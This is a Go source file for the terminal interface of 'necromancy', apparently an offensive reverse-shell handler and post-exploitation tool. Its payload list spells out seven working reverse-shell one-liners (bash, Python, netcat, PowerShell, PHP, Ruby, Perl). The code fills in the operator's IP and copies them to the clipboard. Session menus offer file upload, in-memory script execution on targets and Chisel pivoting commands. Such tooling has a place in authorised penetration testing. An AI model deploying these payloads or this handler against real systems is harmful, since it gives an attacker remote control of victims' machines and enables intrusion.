package ui

import (
	"fmt"
	"log"
	"os/exec"
	"runtime"
	"sort"
	"strings"

	"github.com/Aryma-f4/necromancy/core"
	"github.com/Aryma-f4/necromancy/modules"
	"github.com/Aryma-f4/necromancy/pty"
	"github.com/Aryma-f4/necromancy/utils"
	"github.com/gdamore/tcell/v2"
	"github.com/rivo/tview"
)

type App struct {
	tviewApp        *tview.Application
	pages           *tview.Pages
	sessions        *core.SessionManager
	menuList        *tview.List
	shellWorkspaces map[int]*sessionShellWorkspace
}

var (
	colorBackground = tcell.NewRGBColor(8, 11, 18)
	colorPanel      = tcell.NewRGBColor(14, 19, 28)
	colorPanelAlt   = tcell.NewRGBColor(20, 28, 40)
	colorAccent     = tcell.NewRGBColor(92, 145, 255)
	colorAccentSoft = tcell.NewRGBColor(52, 86, 140)
	colorPrimary    = tcell.NewRGBColor(235, 240, 255)
	colorSecondary  = tcell.NewRGBColor(152, 214, 189)
	colorMuted      = tcell.NewRGBColor(120, 129, 149)
	colorWarning    = tcell.NewRGBColor(255, 210, 92)
)

type payloadDefinition struct {
	Name        string
	Description string
	Command     string
}

func payloadDefinitions() []payloadDefinition {
	// Get the current port from global config
	port := ""
	if core.GlobalConfig != nil {
		port = core.GlobalConfig.Ports
	}
	if port == "" {
		port = "4444"
	}

	// If multiple ports, use the first one
	ports := strings.Split(port, ",")
	firstPort := strings.TrimSpace(ports[0])

	return []payloadDefinition{
		{
			Name:        "Bash",
			Description: "Classic bash TCP reverse shell",
			Command:     fmt.Sprintf("bash -i >& /dev/tcp/YOUR_IP/%s 0>&1", firstPort),
		},
		{
			Name:        "Python",
			Description: "Python PTY reverse shell",
			Command:     fmt.Sprintf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`, firstPort),
		},
		{
			Name:        "Netcat",
			Description: "FIFO-based netcat reverse shell",
			Command:     fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP %s >/tmp/f", firstPort),
		},
		{
			Name:        "PowerShell",
			Description: "PowerShell reverse shell",
			Command:     fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("YOUR_IP",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, firstPort),
		},
		{
			Name:        "PHP",
			Description: "PHP reverse shell",
			Command:     fmt.Sprintf(`php -r '$sock=fsockopen("YOUR_IP",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, firstPort),
		},
		{
			Name:        "Ruby",
			Description: "Ruby reverse shell",
			Command:     fmt.Sprintf(`ruby -rsocket -e'exit if fork;c=TCPSocket.new("YOUR_IP","%s");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`, firstPort),
		},
		{
			Name:        "Perl",
			Description: "Perl reverse shell",
			Command:     fmt.Sprintf(`perl -e 'use Socket;$i="YOUR_IP";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, firstPort),
		},
	}
}

func copyTextToClipboard(text string) error {
	type candidate struct {
		name string
		args []string
	}

	candidates := []candidate{}
	switch runtime.GOOS {
	case "darwin":
		candidates = append(candidates, candidate{name: "pbcopy"})
	case "windows":
		candidates = append(candidates, candidate{name: "clip"})
	default:
		candidates = append(candidates,
			candidate{name: "wl-copy"},
			candidate{name: "xclip", args: []string{"-selection", "clipboard"}},
			candidate{name: "xsel", args: []string{"--clipboard", "--input"}},
		)
	}

	var lastErr error
	for _, candidate := range candidates {
		path, err := exec.LookPath(candidate.name)
		if err != nil {
			lastErr = err
			continue
		}
		cmd := exec.Command(path, candidate.args...)
		cmd.Stdin = strings.NewReader(text)
		if err := cmd.Run(); err == nil {
			return nil
		} else {
			lastErr = err
		}
	}

	if lastErr != nil {
		return fmt.Errorf("clipboard tool not available: %w", lastErr)
	}
	return fmt.Errorf("clipboard tool not available")
}

func (a *App) mainMenuSummary() string {
	activeSessions := len(a.sessions.GetAll())
	ports := listenerPortsSummary()
	return fmt.Sprintf(
		"[#5c91ff]Control Center[-]\n"+
			"[#98d6bd]Active sessions:[-] %d\n"+
			"[#98d6bd]Listening ports:[-] %s\n\n"+
			"[#ffd25c]Quick navigation[-]\n"+
			" [#5c91ff]s[-] Sessions\n"+
			" [#5c91ff]p[-] Payloads\n"+
			" [#5c91ff]m[-] Modules\n"+
			" [#5c91ff]n[-] Network Info\n"+
			" [#5c91ff]i[-] Interfaces\n"+
			" [#5c91ff]q[-] Exit\n\n"+
			"[#ffd25c]Operator notes[-]\n"+
			" - Use arrow keys to move\n"+
			" - Press Enter to open a panel\n"+
			" - Press Esc to go back",
		activeSessions, ports,
	)
}

func mainMenuDetails(mainText, secondaryText string) string {
	return fmt.Sprintf(
		"[#ffd25c]Selected Panel[-]\n"+
			"[#98d6bd]%s[-]\n\n"+
			"%s\n\n"+
			"[#5c91ff]Action[-]\n"+
			"Press [#98d6bd]Enter[-] to open this panel.",
		mainText,
		secondaryText,
	)
}

func listenerPortsSummary() string {
	if core.GlobalConfig == nil || strings.TrimSpace(core.GlobalConfig.Ports) == "" {
		return "4444"
	}

	parts := strings.Split(core.GlobalConfig.Ports, ",")
	cleaned := make([]string, 0, len(parts))
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part != "" {
			cleaned = append(cleaned, part)
		}
	}
	if len(cleaned) == 0 {
		return "4444"
	}
	return strings.Join(cleaned, ", ")
}

func newPageHeader(title, subtitle string) *tview.TextView {
	header := tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignLeft)
	header.SetBackgroundColor(colorPanel)
	header.SetText(fmt.Sprintf(" [#ffd25c]%s[-]\n [#788195]%s[-]", title, subtitle))
	return header
}

func newPageFooter(text string) *tview.TextView {
	footer := tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignCenter)
	footer.SetBackgroundColor(colorPanel)
	footer.SetText(fmt.Sprintf("[#788195]%s[-]", text))
	return footer
}

func wrapPage(title, subtitle, footerText string, content tview.Primitive, focusContent bool) tview.Primitive {
	layout := tview.NewFlex().SetDirection(tview.FlexRow)
	layout.SetBackgroundColor(colorBackground)
	layout.AddItem(newPageHeader(title, subtitle), 2, 0, false)
	layout.AddItem(content, 0, 2, focusContent)
	layout.AddItem(newPageFooter(footerText), 1, 0, false)
	return layout
}

func styleList(list *tview.List, title string) *tview.List {
	list.SetBorder(true)
	list.SetTitle(title)
	list.SetTitleColor(colorWarning)
	list.SetBorderColor(colorAccentSoft)
	list.SetBackgroundColor(colorPanel)
	list.SetMainTextColor(colorPrimary)
	list.SetSecondaryTextColor(colorSecondary)
	list.SetSelectedBackgroundColor(colorAccentSoft)
	list.SetSelectedTextColor(colorWarning)
	list.SetHighlightFullLine(true)
	list.ShowSecondaryText(true)
	return list
}

func styleTextView(tv *tview.TextView, title string) *tview.TextView {
	tv.SetBorder(true)
	tv.SetTitle(title)
	tv.SetTitleColor(colorWarning)
	tv.SetBorderColor(colorAccentSoft)
	tv.SetBackgroundColor(colorPanel)
	tv.SetTextColor(colorPrimary)
	return tv
}

func styleForm(form *tview.Form, title string) *tview.Form {
	form.SetBorder(true)
	form.SetTitle(title)
	form.SetTitleColor(colorWarning)
	form.SetBorderColor(colorAccentSoft)
	form.SetBackgroundColor(colorPanel)
	form.SetButtonBackgroundColor(colorAccentSoft)
	form.SetButtonTextColor(colorPrimary)
	form.SetFieldBackgroundColor(colorPanelAlt)
	form.SetFieldTextColor(colorPrimary)
	form.SetLabelColor(colorSecondary)
	return form
}

func NewApp(sm *core.SessionManager) *App {
	return &App{
		tviewApp:        tview.NewApplication(),
		pages:           tview.NewPages(),
		sessions:        sm,
		shellWorkspaces: make(map[int]*sessionShellWorkspace),
	}
}

func (a *App) Setup() {
	tview.Styles.PrimitiveBackgroundColor = colorBackground
	tview.Styles.ContrastBackgroundColor = colorPanel
	tview.Styles.MoreContrastBackgroundColor = colorPanelAlt
	tview.Styles.BorderColor = colorAccentSoft
	tview.Styles.TitleColor = colorWarning
	tview.Styles.GraphicsColor = colorAccent
	tview.Styles.PrimaryTextColor = colorPrimary
	tview.Styles.SecondaryTextColor = colorSecondary
	tview.Styles.TertiaryTextColor = colorMuted
	tview.Styles.InverseTextColor = colorBackground
	tview.Styles.ContrastSecondaryTextColor = colorAccent

	root := tview.NewFlex().SetDirection(tview.FlexRow)
	header := tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignCenter)
	header.SetBackgroundColor(colorPanel)
	header.SetText(fmt.Sprintf(
		"[#ffd25c]Necromancy Operations Dashboard[-]\n[#98d6bd]Sessions:[-] %d   [#788195]|[-]   [#98d6bd]Ports:[-] %s   [#788195]|[-]   [#5c91ff]Mode:[-] TUI",
		len(a.sessions.GetAll()),
		listenerPortsSummary(),
	))

	a.menuList = tview.NewList().
		AddItem("Sessions", "View active reverse shells and open per-session actions", 's', a.showSessionsList).
		AddItem("Payloads", "Preview payloads, refresh listener IP, and copy to clipboard", 'p', a.showPayloads).
		AddItem("Modules", "Browse post-exploitation modules used after a reverse shell is established", 'm', a.showAllModules).
		AddItem("Network Info", "Show local IP, public IP, and configured listener ports", 'n', a.showNetworkInfo).
		AddItem("Interfaces", "List available local network interfaces", 'i', a.showInterfaces).
		AddItem("Exit", "Quit the application", 'q', func() {
			a.tviewApp.Stop()
		})

	styleList(a.menuList, " Navigation ")

	infoView := tview.NewTextView().
		SetDynamicColors(true).
		SetWrap(true)
	styleTextView(infoView, " Overview ")
	infoView.SetText(a.mainMenuSummary())

	footer := tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignCenter)
	footer.SetBackgroundColor(colorPanel)
	footer.SetText("[#788195]Arrows navigate  [#5c91ff]|[-]  Enter opens panel  [#5c91ff]|[-]  Esc goes back  [#5c91ff]|[-]  q exits[-]")

	a.menuList.SetChangedFunc(func(index int, mainText string, secondaryText string, shortcut rune) {
		if mainText == "" {
			infoView.SetText(a.mainMenuSummary())
			return
		}
		infoView.SetText(mainMenuDetails(mainText, secondaryText))
	})

	body := tview.NewFlex().
		AddItem(a.menuList, 0, 2, true).
		AddItem(infoView, 0, 3, false)

	root.AddItem(header, 2, 0, false)
	root.AddItem(body, 0, 1, true)
	root.AddItem(footer, 1, 0, false)

	a.pages.AddPage("menu", root, true, true)
}

func (a *App) Run() error {
	return a.tviewApp.SetRoot(a.pages, true).EnableMouse(true).Run()
}

func (a *App) showSessionsList() {
	list := tview.NewList()
	styleList(list, " Active Sessions ")

	sess := a.sessions.GetAll()
	if len(sess) == 0 {
		list.AddItem("No active sessions", "Wait for a reverse shell to connect, then refresh this view", 'n', nil)
	} else {
		for i, s := range sess {
			idx := i
			shortcut := rune('1' + idx)
			title := fmt.Sprintf("Session %d  %s", s.ID, s.RemoteAddr)
			description := fmt.Sprintf("Type: %s  |  Press Enter to open session actions", s.Type)

			list.AddItem(title, description, shortcut, func() {
				a.showSessionActions(s.ID)
			})
		}
	}

	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})

	a.pages.AddPage("sessions", wrapPage("Active Sessions", "Select a session to open the shell, modules, or file manager", "Esc returns to the main dashboard", list, true), true, true)
}

func (a *App) UpdateSessionsList() {
	a.tviewApp.QueueUpdateDraw(func() {
		a.showSessionsList()
	})
}

func (a *App) showSessionActions(id int) {
	_, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	list := tview.NewList().
		AddItem("Shell Tabs", "Open a tabbed shell workspace inside the TView UI", 't', func() {
			a.openSessionShellTabs(id)
		}).
		AddItem("Raw Interact", "Open the raw interactive shell for this session", 'i', func() {
			a.openSessionTerminal(id)
		}).
		AddItem("File Manager", "Browse and manage target files in the terminal UI", 'f', func() {
			a.openFileManager(id)
		}).
		AddItem("Cancel Commands", "Send an interrupt to stop the currently running command", 'c', func() {
			session, exists := a.sessions.Get(id)
			if !exists {
				a.showSessionsList()
				return
			}
			if err := session.CancelRunningCommands(); err != nil {
				log.Printf("Cancel commands error: %v", err)
			}
			a.showSessionActions(id)
		}).
		AddItem("Run Module", "Run a post-exploitation module after the reverse shell is already active", 'm', func() {
			a.showModulesList(id)
		}).
		AddItem("Upload File", "Upload a local file to the target through base64", 'u', func() {
			a.showUploadForm(id)
		}).
		AddItem("In-Memory Exec", "Execute a local script on the target without storing it permanently", 'e', func() {
			a.showExecForm(id)
		}).
		AddItem("Port Forwarding", "Open tunneling and pivoting guidance", 'p', func() {
			a.showPortFwd(id)
		}).
		AddItem("Kill", "Terminate and remove this session", 'k', func() {
			if workspace, ok := a.shellWorkspaces[id]; ok {
				if workspace.outputSub != nil {
					workspace.session.Unsubscribe(workspace.outputSub)
				}
				delete(a.shellWorkspaces, id)
				a.pages.RemovePage(workspace.pageName)
			}
			a.sessions.Remove(id)
			a.showSessionsList()
		})

	styleList(list, fmt.Sprintf(" Session %d Actions ", id))
	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.showSessionsList()
			return nil
		}
		return event
	})

	a.pages.AddPage("session_actions", wrapPage(fmt.Sprintf("Session %d", id), "Choose an action for this target, including raw shell access or tabbed shell workspaces", "Esc returns to the session list", list, true), true, true)
}

func (a *App) showUploadForm(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	form := tview.NewForm().
		AddInputField("Local File", "", 40, nil, nil).
		AddInputField("Remote Destination", "/tmp/uploaded", 40, nil, nil)

	form.AddButton("Upload", func() {
		local := form.GetFormItem(0).(*tview.InputField).GetText()
		remote := form.GetFormItem(1).(*tview.InputField).GetText()
		if local != "" && remote != "" {
			// Do upload
			err := modules.UploadFile(session, local, remote)
			if err != nil {
				log.Printf("Upload error: %v", err)
			}
		}
		a.showSessionActions(id)
	}).
		AddButton("Cancel", func() {
			a.showSessionActions(id)
		})

	styleForm(form, fmt.Sprintf(" Upload to Session %d ", id))
	a.pages.AddPage("upload_form", wrapPage("Upload File", "Send a local file to the target using the destination path you choose", "Esc returns to session actions", form, true), true, true)
}

func (a *App) showExecForm(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	form := tview.NewForm().
		AddInputField("Local Script", "", 40, nil, nil)

	form.AddButton("Execute", func() {
		local := form.GetFormItem(0).(*tview.InputField).GetText()
		if local != "" {
			err := modules.ExecuteInMemory(session, local)
			if err != nil {
				log.Printf("Execute error: %v", err)
			}
		}
		a.showSessionActions(id)
	}).
		AddButton("Cancel", func() {
			a.showSessionActions(id)
		})

	styleForm(form, fmt.Sprintf(" Execute In-Memory on Session %d ", id))
	a.pages.AddPage("exec_form", wrapPage("In-Memory Execution", "Execute a local script directly on the target without a full upload", "Esc returns to session actions", form, true), true, true)
}

func (a *App) showPortFwd(id int) {
	tv := tview.NewTextView().SetDynamicColors(true)
	styleTextView(tv, fmt.Sprintf(" Port Forwarding (Session %d) ", id))

	instructions := `[yellow]Port Forwarding / Pivoting[white]

To tunnel traffic through this shell, we recommend using Chisel.
Since Python is no longer used for the background agent, the native Go
method is to upload a statically compiled Chisel binary or run Ligolo.

1. Upload chisel to the target:
   (Go back, select 'Upload File', upload your local chisel binary)

2. Execute Chisel on the target to connect back to your server:
   ./chisel client YOUR_IP:8080 R:socks

3. Run Chisel server locally:
   chisel server -p 8080 --reverse

[green]Note: You can also use the 'Run Module' menu to automate Ligolo/Chisel setup.[white]
`
	tv.SetText(instructions)
	tv.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.showSessionActions(id)
			return nil
		}
		return event
	})
	a.pages.AddPage("portfwd", wrapPage("Port Forwarding", "Quick pivoting guidance for the active session", "Esc returns to session actions", tv, true), true, true)
}

func (a *App) showModulesList(id int) {
	if _, exists := a.sessions.Get(id); !exists {
		return
	}

	mm := modules.NewModuleManager()
	list := tview.NewList()
	styleList(list, fmt.Sprintf(" Modules for Session %d ", id))

	names := make([]string, 0, len(mm.Modules))
	for name := range mm.Modules {
		names = append(names, name)
	}
	sort.Strings(names)

	for _, name := range names {
		modName := name
		mod := mm.Modules[name]
		list.AddItem(modName, mod.Description(), 0, func() {
			workspace := a.ensureSessionShellWorkspace(id)
			if workspace == nil {
				log.Printf("Module error: failed to open shell workspace for session %d", id)
				a.showSessionActions(id)
				return
			}
			a.showModuleTabSelector(id, modName, mm, workspace)
		})
	}

	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.showSessionActions(id)
			return nil
		}
		return event
	})

	a.pages.AddPage("modules_list", wrapPage("Run Modules", "These modules are meant to be executed after a reverse shell is established", "Esc returns to session actions", list, true), true, true)
}

func (a *App) showModuleTabSelector(id int, moduleName string, mm *modules.ModuleManager, workspace *sessionShellWorkspace) {
	selector := tview.NewList()
	styleList(selector, fmt.Sprintf(" Target Tab for %s ", moduleName))

	tabChoices := workspace.tabChoices()
	for i, tabTitle := range tabChoices {
		tabIndex := i
		choiceTitle := tabTitle
		selector.AddItem(choiceTitle, fmt.Sprintf("Run module '%s' using %s", moduleName, choiceTitle), 0, func() {
			if !workspace.activateTab(tabIndex) {
				log.Printf("Module tab select error: invalid tab index %d", tabIndex)
				return
			}
			if err := workspace.runModuleInTab(moduleName, mm); err != nil {
				log.Printf("Module error: %v", err)
				return
			}
			a.pages.SwitchToPage(workspace.pageName)
			a.tviewApp.SetFocus(workspace.input)
		})
	}

	selector.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.showModulesList(id)
			return nil
		}
		return event
	})

	pageName := fmt.Sprintf("module_tab_selector_%d", id)
	a.pages.AddPage(pageName, wrapPage(
		"Select Module Target Tab",
		fmt.Sprintf("Choose which shell tab should dispatch '%s'", moduleName),
		"Esc returns to modules list",
		selector,
		true,
	), true, true)
	a.pages.SwitchToPage(pageName)
}

func (a *App) ensureSessionShellWorkspace(id int) *sessionShellWorkspace {
	if workspace, ok := a.shellWorkspaces[id]; ok {
		return workspace
	}

	session, exists := a.sessions.Get(id)
	if !exists {
		return nil
	}

	workspace := newSessionShellWorkspace(a, session)
	a.shellWorkspaces[id] = workspace
	a.pages.AddPage(
		workspace.pageName,
		wrapPage(
			fmt.Sprintf("Shell Tabs - Session %d", id),
			"Create multiple shell tabs for the same session; all tabs share the same underlying remote stream",
			"Ctrl+N new tab  |  Ctrl+W close tab  |  Tab / Shift+Tab switch tab  |  Esc returns to session actions",
			workspace.root,
			true,
		),
		true,
		true,
	)
	return workspace
}

func (a *App) openSessionTerminal(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	// 1. Suspend the Tview Application to drop into raw terminal
	a.tviewApp.Suspend(func() {
		// 2. Clear terminal screen
		fmt.Print("\033[H\033[2J")

		// 3. Auto PTY upgrade if it's the first time connecting
		if session.Type != "PTY" {
			fmt.Printf("[*] Auto-upgrading Session %d to PTY...\n", session.ID)
			err := pty.AutoUpgrade(session)
			if err != nil {
				log.Printf("PTY upgrade failed: %v", err)
			}
		}

		// 4. Drop into raw mode interaction loop
		core.Interact(session)
	})

	// Return back to session list after Detach (F12)
	a.showSessionsList()
}

func (a *App) openFileManager(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	// Create file manager with existing app
	fms := modules.NewFileManagerSession(session)
	fileManager := modules.NewFileManagerUI(fms, a.tviewApp, func() {
		// Return to session actions
		a.showSessionActions(id)
	})

	mainLayout := tview.NewFlex().SetDirection(tview.FlexRow)
	mainLayout.AddItem(fileManager.Layout, 0, 1, true)

	// Set up input capture to handle escape key
	mainLayout.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			// Return to session actions
			a.showSessionActions(id)
			return nil
		}
		return event
	})

	// Switch to file manager page
	a.pages.AddPage("file_manager", wrapPage("File Manager", "Manage target files directly from the main UI", "Esc returns to session actions", mainLayout, true), true, true)
	a.pages.SwitchToPage("file_manager")
}

func (a *App) showInterfaces() {
	tv := tview.NewTextView().SetDynamicColors(true)
	styleTextView(tv, " Network Interfaces ")
	tv.SetText(core.GetInterfaces())
	tv.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})
	a.pages.AddPage("interfaces", wrapPage("Interfaces", "Overview of the available local network interfaces", "Esc returns to the main dashboard", tv, true), true, true)
}

func (a *App) showNetworkInfo() {
	tv := tview.NewTextView().SetDynamicColors(true)
	styleTextView(tv, " Network Information ")

	// Get network info
	networkInfo := utils.GetNetworkInfo()
	infoText := utils.FormatNetworkInfo(networkInfo)

	// Add additional info
	infoText += "\n[yellow]Listening Ports:[white]\n"
	if core.GlobalConfig != nil && core.GlobalConfig.Ports != "" {
		ports := strings.Split(core.GlobalConfig.Ports, ",")
		for i, port := range ports {
			infoText += fmt.Sprintf("  [%d] Port %s\n", i+1, strings.TrimSpace(port))
		}
	} else {
		infoText += "  No ports configured\n"
	}

	infoText += "\n[gray]Press Esc to return to menu[-]"

	tv.SetText(infoText)
	tv.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})
	a.pages.AddPage("network_info", wrapPage("Network Info", "View the local IP, public IP, and active listener ports", "Esc returns to the main dashboard", tv, true), true, true)
}

func (a *App) showPayloads() {
	// Disable TUI mouse reporting on this page so the terminal can use
	// regular mouse drag selection for copying payload text.
	a.tviewApp.EnableMouse(false)

	payloads := payloadDefinitions()

	// Get network info for IP replacement
	networkInfo := utils.GetNetworkInfo()
	localIP := networkInfo["local_ip"]
	publicIP := networkInfo["public_ip"]
	if publicIP != "Unknown" && !utils.IsPrivateIP(publicIP) {
		localIP = publicIP // Use public IP if available
	}

	list := tview.NewList()
	styleList(list, " Payload Types ")

	preview := tview.NewTextView().
		SetDynamicColors(true).
		SetWrap(true)
	styleTextView(preview, " Payload Preview ")

	status := tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignCenter)
	status.SetBackgroundColor(colorPanel)
	status.SetText("[#788195]Drag mouse in terminal to select payload text  [#5c91ff]|[-]  Enter/c copies  [#5c91ff]|[-]  r refreshes IP  [#5c91ff]|[-]  Esc goes back[-]")

	updatePreview := func(index int) {
		if index < 0 || index >= len(payloads) {
			return
		}
		item := payloads[index]
		// Replace YOUR_IP with actual IP
		displayCmd := strings.ReplaceAll(item.Command, "YOUR_IP", localIP)
		preview.SetText(fmt.Sprintf("[#ffd25c]%s[-]\n[#98d6bd]%s[-]\n\n[#5c91ff]%s[-]", item.Name, item.Description, displayCmd))
	}

	copyCurrentPayload := func() {
		index := list.GetCurrentItem()
		if index < 0 || index >= len(payloads) {
			status.SetText("[red]No payload selected[-]")
			return
		}

		cmdToCopy := strings.ReplaceAll(payloads[index].Command, "YOUR_IP", localIP)
		if err := copyTextToClipboard(cmdToCopy); err != nil {
			status.SetText(fmt.Sprintf("[red]Copy failed:[-] %v", err))
			return
		}

		status.SetText(fmt.Sprintf("[#98d6bd]Payload copied:[-] %s", payloads[index].Name))
	}

	for i, payload := range payloads {
		idx := i
		list.AddItem(payload.Name, payload.Description, 0, func() {
			updatePreview(idx)
		})
	}

	list.SetChangedFunc(func(index int, mainText string, secondaryText string, shortcut rune) {
		updatePreview(index)
	})

	updatePreview(0)

	root := tview.NewFlex().
		AddItem(list, 0, 2, true).
		AddItem(preview, 0, 3, false)
	layout := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(root, 0, 1, true).
		AddItem(status, 1, 0, false)

	handlePayloadKey := func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.tviewApp.EnableMouse(true)
			a.pages.SwitchToPage("menu")
			return nil
		}
		if event.Key() == tcell.KeyTAB {
			if a.tviewApp.GetFocus() == list {
				a.tviewApp.SetFocus(preview)
			} else {
				a.tviewApp.SetFocus(list)
			}
			return nil
		}
		if event.Key() == tcell.KeyEnter {
			copyCurrentPayload()
			return nil
		}
		if event.Key() == tcell.KeyRune && (event.Rune() == 'c' || event.Rune() == 'C') {
			copyCurrentPayload()
			return nil
		}
		if event.Key() == tcell.KeyRune && (event.Rune() == 'r' || event.Rune() == 'R') {
			// Refresh network info
			networkInfo = utils.GetNetworkInfo()
			localIP = networkInfo["local_ip"]
			publicIP = networkInfo["public_ip"]
			if publicIP != "Unknown" && !utils.IsPrivateIP(publicIP) {
				localIP = publicIP
			}
			updatePreview(list.GetCurrentItem())
			status.SetText("[#98d6bd]Network information refreshed[-]")
			return nil
		}
		return event
	}

	list.SetInputCapture(handlePayloadKey)
	preview.SetInputCapture(handlePayloadKey)
	layout.SetInputCapture(handlePayloadKey)

	a.pages.AddPage("payloads", wrapPage("Payloads", "Preview payloads using the current listener IP", "Esc returns to the main dashboard", layout, true), true, true)
}

func (a *App) showAllModules() {
	mm := modules.NewModuleManager()
	list := tview.NewList()
	styleList(list, " Available Modules ")

	names := make([]string, 0, len(mm.Modules))
	for name := range mm.Modules {
		names = append(names, name)
	}
	sort.Strings(names)

	for _, name := range names {
		list.AddItem(name, mm.Modules[name].Description(), 0, nil)
	}

	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})

	a.pages.AddPage("all_modules", wrapPage("Available Modules", "Browse every registered module; they are intended for use after a reverse shell is established", "Esc returns to the main dashboard", list, true), true, true)
}
